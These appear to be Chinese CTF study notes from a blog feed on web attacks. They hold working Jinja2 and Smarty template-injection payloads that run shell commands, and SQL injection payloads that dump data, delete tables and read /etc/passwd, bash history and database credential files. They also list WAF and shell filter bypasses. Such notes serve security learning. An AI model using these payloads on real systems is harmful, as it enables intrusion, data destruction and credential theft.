<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[131].__init__.__globals__[&apos;__builtins__&apos;][&apos;ev&apos;+&apos;al&apos;](&apos;__im&apos;+&apos;port__(&quot;o&apos;+&apos;s&quot;).po&apos;+&apos;pen(&quot;cat /this_is_the_fl&apos;+&apos;ag.txt&quot;)&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&apos;sys&apos;].modules[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;po&apos;+&apos;pen&apos;](&apos;cat /this_is_the_fl&apos;+&apos;ag.txt&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>python还有一些内置函数，比如url_for和get_flashed_messages </p>
</blockquote>
<p><strong>get_flashed_messages</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</span><br></pre></td></tr></table></figure>

<h2 id="测试一下是否是smarty"><a href="#测试一下是否是smarty" class="headerlink" title="测试一下是否是smarty"></a>测试一下是否是smarty</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7&#123;*comment*&#125;7   77</span><br></pre></td></tr></table></figure>

<h2 id="smarty-常用payload"><a href="#smarty-常用payload" class="headerlink" title="smarty 常用payload"></a>smarty 常用payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&apos;ls&apos;)&#125;&#123;/if&#125;</span><br><span class="line">&#123; readfile(&apos;/flag&apos;) &#125;</span><br><span class="line">&#123;if show_source(&apos;/flag&apos;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&apos;cat ../../../flag&apos;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2020/03/17/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<blockquote>
<ul>
<li>对表名为纯数字的表进行操作时，要在前后加上`符号。</li>
<li>对列名进行更改时，要在后面指定修改后的数据类型  </li>
<li>盲注时候多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</li>
<li>SQL注入常用URL编码<br>空格 %20<br>‘ %27<br># %23<br>\ %5C</li>
<li>php-addslashes函数：在特殊字符前加上反斜线\来转义</li>
<li>如何从addslashes函数逃逸？<ul>
<li><code>\</code>前面再加一个<code>\</code>，变成<code>\\&#39;</code>，这样\就被转义了</li>
<li>把\弄没</li>
</ul>
</li>
<li>表名或列名可以使用16进制转码来实现<br>例如：ctf -&gt; 0x637466<br>sqlmap中加参数<code>--hex</code></li>
</ul>
</blockquote><a id="more"></a>
<h1 id="sql注入12个报错方式"><a href="#sql注入12个报错方式" class="headerlink" title="sql注入12个报错方式"></a>sql注入12个报错方式</h1><p><a href="https://www.bugku.com/forum.php?mod=viewthread&tid=93&extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">sql注入12个报错方式</a></p>
<blockquote>
<p>1、通过floor报错,注入语句如下:<br>and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>
<p>2、通过ExtractValue报错,注入语句如下:<br>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
<p>3、通过UpdateXml报错,注入语句如下:<br>and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
<p>4、通过NAME_CONST报错,注入语句如下:<br>and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
<p>5、通过join报错,注入语句如下:<br>select * from(select * from mysql.user ajoin mysql.user b)c;</p>
<p>6、通过exp报错,注入语句如下:<br>and exp(~(select * from (select user () ) a) );</p>
<p>7、通过GeometryCollection()报错,注入语句如下:<br>and GeometryCollection(()select *from(select user () )a)b );</p>
<p>8、通过polygon ()报错,注入语句如下:<br>and polygon (()select * from(select user ())a)b );</p>
<p>9、通过multipoint ()报错,注入语句如下:<br>and multipoint (()select * from(select user() )a)b );</p>
<p>10、通过multlinestring ()报错,注入语句如下:<br>and multlinestring (()select * from(selectuser () )a)b );</p>
<p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p>
<p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p>
</blockquote>
<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p> 原理：能够截取字符串，同时触发延时即可<br><code>SELECT * FROM table WHERE id = 1 AND (if(SUBSTR(database(),1,1)=&#39; &#39;,sleep(5),null))</code><br><code>SELECT * FROM table WHERE id = 1 AND (if(acsii(substr(database(),1,1))=100,sleep(5),null))</code> </p>
<p>相关函数</p>
<ul>
<li><p>延时方法</p>
<ul>
<li>SLEEP(duration)<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/sleep.png" alt></li>
</ul>
</li>
<li><p>BENCHMARK(count,expr)<br>  <img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/benchmark.png" alt></p>
<ul>
<li>例如<code>select benchmark(10000000,sha(1))</code></li>
<li>笛卡尔积<br>例如<code>SELECT count(*) FROM information_schema.columns A,information_schema.columns B, information_schema.tables C;</code><br>ps:COUNT(*)计算行数</li>
<li>GET_LOCK(str,timeout)<br>需要开启两个会话才能生效<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/GET_LOCK.png" alt></li>
<li>RLIKE<br>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短<br>例如<code>select concat(rpad(1,9999999,&#39;a&#39;),rpad(1,9999999,&#39;a&#39;),···,rpad(1,9999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+···+(a.*)+b</code><br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/RLIKE.png" alt></li>
<li>条件<ul>
<li>IF(expr1,expr2,expr3)<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/IF.png" alt></li>
</ul>
</li>
<li>CASE WHEN [condition] when [result]<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/CASE.png" alt></li>
<li>字符串截取<ul>
<li>SUBSTR(SUBSTRING)<br>substr同substring，有多种参数选择<br><code>SUBSTRING(str,pos)</code>, <code>SUBSTRING(str FROM pos)</code>, <code>SUBSTRING(str,pos,len)</code>, <code>SUBSTRING(str FROM pos FOR len)</code><br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/SUBSTR.png" alt></li>
</ul>
</li>
<li>MID(str,pos,len)同SUBSTRING(str,pos,len)</li>
<li>SUBSTRING_INDEX(str,delim,count)<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/SUBSTRING_INDEX.png" alt></li>
<li>LEFT(str,len)<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/LEFT.png" alt></li>
<li>字符串转换<ul>
<li>ASCII()</li>
<li>ORD()</li>
<li>CHR()</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>​    </p>
<h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote>
<p>在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL </p>
</blockquote>
<blockquote>
<p>​    在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products;当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 </p>
</blockquote>
<h1 id="mysql查询语句-handler"><a href="#mysql查询语句-handler" class="headerlink" title="mysql查询语句-handler"></a>mysql查询语句-handler</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>    HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p>
</blockquote>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>handler语句的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>

<p>​    通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>​    通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>​    通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
<pre><code>通过索引去查看的话可以按照一定的顺序，获取表中的数据。
通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。

通过索引列指定一个值，可以指定从哪一行开始。
通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。

如果我们不想浏览一个表的所有行，可以使用where和limit子句。</code></pre><h1 id="预编译绕过"><a href="#预编译绕过" class="headerlink" title="预编译绕过"></a>预编译绕过</h1><p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&apos;;set @sql = CONCAT(&apos;se&apos;,&apos;lect * from `1919810931114514`;&apos;);prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>

<h1 id="load-file-的使用"><a href="#load-file-的使用" class="headerlink" title="load_file()的使用"></a>load_file()的使用</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 要有file_priv权限</span><br><span class="line"><span class="number">2.</span> 知道文件绝对路径</span><br><span class="line"><span class="number">3.</span> 对web目录有读权限  </span><br><span class="line">注：若过滤了单引号，则可以将函数中的字符进行hex编码</span><br></pre></td></tr></table></figure>

<p><code>select @@secure_file_priv</code><br>secure_file_priv</p>
<ul>
<li>1、限制mysqld 不允许导入 | 导出<br><code>--secure_file_prive=null</code></li>
<li>2、限制mysqld 的导入 | 导出 只能发生在/tmp/目录下<br><code>--secure_file_priv=/tmp/</code></li>
<li>3、不对mysqld 的导入 | 导出做限制<br><code>--secure_file_priv=</code></li>
</ul>
<h2 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h2><p>读/etc/init.d下的东西，这里有配置文件路径</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/init.d/httpd'</span>)</span><br></pre></td></tr></table></figure>

<p>得到web安装路径</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/apache/conf/httpd.conf'</span>)</span><br></pre></td></tr></table></figure>

<p>读取密码文件</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="class"><span class="keyword">union</span> <span class="title">select</span></span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="symbol">'var</span>/www/html/xxx.com/php/conn.inc.php')</span><br></pre></td></tr></table></figure>

<p>  读取系统中所有的用户和用户的主要信息 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;/etc/passwd&apos;)</span><br></pre></td></tr></table></figure>

<p>查看用户的history</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;~/.bash_history&apos;)     （“~/”表示用户目录）</span><br></pre></td></tr></table></figure>

<h1 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h1><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">SQL注入绕过技巧</a> </p>
<ul>
<li><p>空格</p>
<ul>
<li>/**/</li>
</ul>
</li>
<li><p>=</p>
<ul>
<li>like</li>
<li>regexp</li>
<li>!(&lt;&gt;)</li>
</ul>
</li>
<li><p>‘</p>
<ul>
<li>转义符<code>\</code></li>
<li>16进制(例如：ctf -&gt; 0x637466)</li>
</ul>
</li>
<li><p>，</p>
<ul>
<li>union注入使用join，例如<code>3&#39; union select * from (select 1) a join (select 2 ) b %23</code></li>
<li>substr from for</li>
<li>if-&gt;case when</li>
</ul>
</li>
<li><p>无数字字母</p>
<p>其它重要绕过参考：<a href="https://xz.aliyun.com/t/5505#toc-2" target="_blank" rel="noopener">SQL注入有趣姿势总结</a><br><a href="https://www.smi1e.top/sql注入笔记/" target="_blank" rel="noopener">Sql注入笔记</a><br><a href="http://www.sohu.com/a/157844303_354899" target="_blank" rel="noopener">SQL注入之骚姿势小记</a><br><a href="https://www.cnblogs.com/sijidou/p/10243458.html" target="_blank" rel="noopener">sql注入总结(一)–2018自我整理</a> </p>
<p>information_schema 被过滤</p>
</li>
</ul>
<p><a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">无需“in”的SQL盲注</a> </p>
<blockquote>
<p>sys.schema_table_statistics_with_buffer </p>
<p> <a href="https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/" target="_blank" rel="noopener">mysql.innodb_table_stats</a> </p>
<p> sys.x$schema_flattened_keys</p>
<p> sys.schema_table_statistics  </p>
</blockquote>
<blockquote>
<p>Tips：<br>substr()的小技巧：例如在substr(database(),1,1)中逗号被过滤了，我们可以使用from 1 to 1来绕过过滤。<br>那么有同样格式的limit 0,1有没有这样的绕过呢？当然有。格式为：1 offset 0这里注查询数字的顺序。 </p>
</blockquote>
<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p> 如果一个表只包含一列，那么很轻易就可在不知道列名的情况下检索出数据，只需一个简单的<code>SUBSTR((SELECT * FROM table),1,1)=&#39;x&#39;</code>就可，但如果一个表包含多个列，那么这个查询就会抛出一个错误。不过这里有个技巧，就是将查询语句与相同数量的列进行比较！ </p>
<p>关键payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 ^ ( (select 1,1) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure>

<p>这里的1用来探测列数，通过删减1的个数来探测列的数量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 ^ ( (select 1,&apos;f&apos;) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure>

<p>原理：</p>
<ul>
<li>按位去比较，如果爆破字符与flag的第一个字符相等，就向后继续，大了小了都要继续当前的循环，直到找到合适的字符</li>
<li>当小于等于f的时候，是1^0，回显Nu1L，当大于f，即g之类的字符时，是1^1，返回Error Occured When Fetch Result.</li>
<li>所以最后的mid要减一才是正确的字符</li>
<li>这里我们传入十六进制，mysql会自动将十六进制转为字符</li>
<li>mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大 </li>
</ul>
<h1 id="深入探索insert注入与update注入"><a href="#深入探索insert注入与update注入" class="headerlink" title="深入探索insert注入与update注入"></a>深入探索insert注入与update注入</h1><p><a href="https://www.dazhuanlan.com/2019/12/09/5dee607fccd80/" target="_blank" rel="noopener">深入探索insert注入与update注入</a></p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。<br>在我们代码审计的过程中产生这个注入的原因有两个<br>1.character_set_client=gbk(SET NAMES的误用)<br>2.mysql_real_escape_string()的错误使用 </p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>CGI模式</title>
    <url>/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/f-ck-need-u/p/7627035.html" target="_blank" rel="noopener">简单说明CGI和动态请求是什么</a></p><blockquote>
<p>CGI是common gateway interface的缩写，大家都译作通用网关接口 </p>
<p>这个规则会将header中的proxy参数设置为环境变量HTTP_PROXY </p>
</blockquote><a id="more"></a>

<h3 id="CGI介绍"><a href="#CGI介绍" class="headerlink" title="CGI介绍"></a>CGI介绍</h3><p>​    总所周知，web服务器所处理的任务都是静态的，假如其要想处理动态的任务，则需要web应用程序的帮助，比如PHP，jsp，python，perl等为了将web服务器的动态请求传递给这些应用程序，依靠cgi协议。</p>
<p> 简单的cgi工作方式： </p>
<p><img src="/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/CGI%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F.png" alt></p>
<blockquote>
<p> 有多种方式可以执行cgi程序，但对http的请求方法来说，只有get和post两种方法允许执行cgi脚本(即上面的search程序)。实际上post方法的内部本质还是get方法，只不过在发送http请求时，get和post方法对url中的参数处理方式不一样而已。 </p>
</blockquote>
<p> 通过cgi协议，再结合已搭建好的web应用程序，就可以让web server也能”处理”动态请求(或者说，当用户访问某个特定资源时，可以触发执行某个web应用程序来实现特定功能) ,例如，在谷歌搜索栏中搜索一个关键词”http”，对应的URL为： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.google.com/search?q=http&amp;oq=http&amp;aqs=chrome..69i57j69i60l4j0.1136j0j8&amp;sourceid=chrome&amp;ie=UTF-8</span><br></pre></td></tr></table></figure>

<p>当谷歌的web server收到该请求后，先分析该url，从中知道了要执行search程序，并且还知道了一系列要传递给search的参数及其对应的value。web server会将这些程序参数和其它一些环境变量根据cgi协议通过TCP或套接字等方式传递给已启动的cgi程序(可能是cgi进程，或者是已加载的模块cgi模块)。当cgi进程接收到web server的请求后，调用search程序并执行，同时还会传递参数给search程序。search执行结束后，cgi进程/线程将处理结果返回给web server，web server再返回给浏览器。</p>
<p>任何一种语言都能编写CGI，只不过有些语言比较擅长，有些语言则非常繁琐，例如用bash shell开发，那么需要用echo等打印语句将执行结果放在巨多无比的html的标签中输出给客户端。常用于编写CGI的语言有perl、php、python等，java也一样能写，但java的servlet完全能实现CGI的功能，且更优化、更利于开发。</p>
<h3 id="各种术语释疑"><a href="#各种术语释疑" class="headerlink" title="各种术语释疑"></a>各种术语释疑</h3><p> 刚接触cgi概念的时候肯定会有一堆疑问，这到底是什么鬼，处理动态内容的东西不是像php一样的应用程序吗 ？</p>
<p>以php为例，我将一次动态请求相关的概念大致都简单解释一遍。</p>
<ol>
<li><code>cgi</code>：它是一种协议。通过cgi协议，web server可以将动态请求和相关参数发送给专门处理动态内容的应用程序。</li>
<li><code>fastcgi</code>：也是一种协议，只不过是cgi的优化版。cgi的性能较烂，fastcgi则在其基础上进行了改进。</li>
<li><code>php-cgi</code>：fastcgi是一种协议，而php-cgi实现了这种协议。不过这种实现比较烂。它是单进程的，一个进程处理一个请求，处理结束后进程就销毁。</li>
<li><code>php-fmp</code>：是对php-cgi的改进版，它直接管理多个php-cgi进程/线程。也就是说，<strong>php-fpm是php-cgi的进程管理器</strong>因此它也算是fastcgi协议的实现。在一定程度上讲，php-fpm与php的关系，和tomcat对java的关系是类似的。</li>
<li><code>cgi进程/线程</code>：在php上，就是php-cgi进程/线程。专门用于接收web server的动态请求，<strong>调用并初始化zend虚拟机</strong>。</li>
<li><code>cgi脚本</code>：被执行的php源代码文件。</li>
<li><code>zend虚拟机</code>：对php文件做词法分析、语法分析、编译成opcode，并执行。最后关闭zend虚拟机。</li>
<li><code>cgi进程/线程和zend虚拟机的关系</code>：cgi进程调用并初始化zend虚拟机的各种环境。</li>
</ol>
<p>以php-fpm为例，web server从转发动态请求到结束的过程大致如下：</p>
<p>![](CGI模式/web server从转发动态请求到结束过程.png)</p>
<h3 id="web-server和CGI的交互模式"><a href="#web-server和CGI的交互模式" class="headerlink" title="web server和CGI的交互模式"></a>web server和CGI的交互模式</h3><p>​    web server对cgi进程/线程来说，它的作用就是发起动态处理请求，传递一些参数和环境变量，最后接收cgi的返回结果。再通俗而不严谨地说，web server通过cgi/fastcgi协议将动态请求转发给执行cgi脚本的应用程序。通过下面httpd.conf中的转发配置应该很容易理解(httpd和php-fpm的交互)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProxyRequests off</span><br><span class="line">ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/usr/local/apache/htdocs/$1</span><br></pre></td></tr></table></figure>

<p>以最典型的apache httpd和php为例，对于httpd来说，web server和php-cgi有3种交互模式。</p>
<ul>
<li><code>cgi模式</code>：httpd接收到一个动态请求就fork一个cgi进程，cgi进程返回结果给httpd进程后自我销毁。</li>
<li><code>动态模块模式</code>：将php-cgi的模块(例如php5_module)编译进httpd。在httpd启动时会加载模块，加载时也将对应的模块激活，php-cgi也就启动了。(注：纠正一个小小错误，很多人以为动态编译的模块是可以在需要的时候随时加载调用，不需要的时候它们就停止了，实际上不是这样的。和静态编译的模块一样，动态加载的模块在被加载时就被加入到激活链表中，无论是否使用它，它都已经运行在apache httpd的内部。可参考LoadModule指令的官方手册)</li>
<li><code>php-fpm模式</code>：使用php-fpm管理php-cgi，此时httpd不再控制php-cgi进程的启动。可以将php-fpm独立运行在非web服务器上，实现所谓的动静分离。</li>
</ul>
<p>实际上，借助模块mod_fastcgi还可以实现fastcgi模式。同cgi一样，管理模式的先天缺陷决定了这并不是一种好方法。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>笔记</title>
    <url>/2019/12/14/%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="PHP字符串解析漏洞"><a href="#PHP字符串解析漏洞" class="headerlink" title="PHP字符串解析漏洞"></a>PHP字符串解析漏洞</h1><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/news.php?%20news[id%00=42&quot;+AND+1=0–</span><br></pre></td></tr></table></figure>

<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<blockquote>
<p>1.删除空白符</p>
</blockquote>
<blockquote>
<p>2.将某些字符转换为下划线（包括空格）</p>
</blockquote>
<p>我的理解：<br>假如waf不允许num变量传递字母：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</span><br></pre></td></tr></table></figure>

<p>那么我们可以在num前加个空格：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php? num = aaaa</span><br></pre></td></tr></table></figure>

<p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<h1 id="php别名"><a href="#php别名" class="headerlink" title="php别名"></a>php别名</h1><blockquote>
<p>php2, php3, php4, php5, phps, pht, phtm, phtml </p>
</blockquote>
<h1 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h1><blockquote>
<p>利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。 </p>
</blockquote>
<h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$GLOBALS</span><br></pre></td></tr></table></figure>

<h1 id="GIT恢复"><a href="#GIT恢复" class="headerlink" title="GIT恢复"></a>GIT恢复</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log --reflog     </span><br><span class="line">git reset --hard  xxxxxxxxxxxxx           (版本号)</span><br></pre></td></tr></table></figure>

<p>先git log –reflog查看一下 可疑文件 然后在恢复他</p>
<h1 id="JSON转义字符绕过"><a href="#JSON转义字符绕过" class="headerlink" title="JSON转义字符绕过"></a>JSON转义字符绕过</h1><p> json使支持unicode编码的，所以可以用unicode代替关键字 </p>
<p> <code>\uXXXX</code>可以在JSON中转义字符，例如<code>A</code>，<code>\u0041</code>等效 </p>
<h1 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h1><p>如果应用程序使用用户可控制的数据，以危险的方式访问位于应用服务器或其它后端文件系统的文件或目录，就会出现路径遍历。攻击者可以将路径遍历序列放入文件名内，向上回溯，从而访问服务器上的任何文件</p>
<h1 id="上传后门"><a href="#上传后门" class="headerlink" title="上传后门"></a>上传后门</h1><p>通过参数上传后门， <code>%09</code>是水平制表符，必须添加，不然后台会把我们的后门当做目录去解析。 </p>
<h1 id="Nginx重要文件位置"><a href="#Nginx重要文件位置" class="headerlink" title="Nginx重要文件位置"></a>Nginx重要文件位置</h1><blockquote>
<p>配置文件存放目录：/etc/nginx </p>
<p>主配置文件：/etc/nginx/conf/nginx.conf</p>
<p>管理脚本：/usr/lib64/systemd/system/nginx.service </p>
<p>模块：/usr/lisb64/nginx/modules </p>
<p>应用程序：/usr/sbin/nginx </p>
<p>程序默认存放位置：/usr/share/nginx/html </p>
<p>日志默认存放位置：/var/log/nginx </p>
<p>配置文件目录为：/usr/local/nginx/conf/nginx.conf </p>
</blockquote>
<h1 id="IDNA"><a href="#IDNA" class="headerlink" title="IDNA"></a>IDNA</h1><p>在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。 </p>
<h1 id="命令中空格被过滤的解决方法"><a href="#命令中空格被过滤的解决方法" class="headerlink" title="命令中空格被过滤的解决方法"></a>命令中空格被过滤的解决方法</h1><p>linux</p>
<blockquote>
<p>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg=$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
</blockquote>
<p>windows下</p>
<blockquote>
<p>type.\flag.txt<br>type,flag.txt<br>echo,123456</p>
</blockquote>
<h1 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h1><p> 内联，就是将反引号内命令的输出作为输入执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<h1 id="过滤bash"><a href="#过滤bash" class="headerlink" title="过滤bash"></a>过滤bash</h1><blockquote>
<p>用sh。sh的大部分脚本都可以在bash下运行。 </p>
</blockquote>
